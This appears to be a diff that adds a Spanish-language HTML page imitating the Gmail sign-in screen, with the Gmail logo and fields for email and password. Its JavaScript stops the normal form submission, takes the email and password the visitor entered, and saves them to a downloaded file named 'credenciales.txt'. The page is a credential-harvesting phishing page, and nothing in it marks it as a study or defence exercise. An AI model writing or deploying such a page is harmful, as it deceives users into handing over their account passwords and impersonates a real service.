@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Gmail</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Archivo CSS para estilos -->
+</head>
+<body>
+    <div class="container">
+        <img src="gmail_logo.png" alt="Gmail Logo" class="logo">
+        <form id="loginForm" action="#" method="post">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Contraseña" required>
+            </div>
+            <button type="submit">Siguiente</button>
+            <a href="#" class="forgot-password">¿Has olvidado tu contraseña?</a>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe automáticamente
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Crea un objeto Blob con los datos a escribir
+            var blob = new Blob(['Correo electrónico: ' + email + '\nContraseña: ' + password], { type: 'text/plain' });
+
+            // Crea un elemento <a> para descargar el archivo
+            var link = document.createElement('a');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = 'credenciales.txt';
+
+            // Simula un clic en el enlace para iniciar la descarga
+            link.click();
+        });
+    </script> <!-- Script JavaScript -->
+</body>
+
